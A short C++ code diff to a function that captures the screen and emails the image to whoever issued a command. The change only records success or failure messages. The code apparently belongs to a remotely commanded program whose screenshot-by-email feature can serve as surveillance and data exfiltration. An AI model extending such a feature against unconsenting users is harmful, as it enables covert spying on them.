@@ -367,9 +367,11 @@ void ServerManager::handleCaptureScreen(const Json::Value& command) {
 
     if (gmail.sendEmail(this->currentCommand.from, subject, body, filename)) {
         cout << "Screen capture sent successfully via email" << endl;
+		this->currentCommand.message = "Screen capture sent successfully via email";
     }
     else {
         cout << "Failed to send screen capture via email" << endl;
+		this->currentCommand.message = "Failed to send screen capture via email";
     }
 }
 
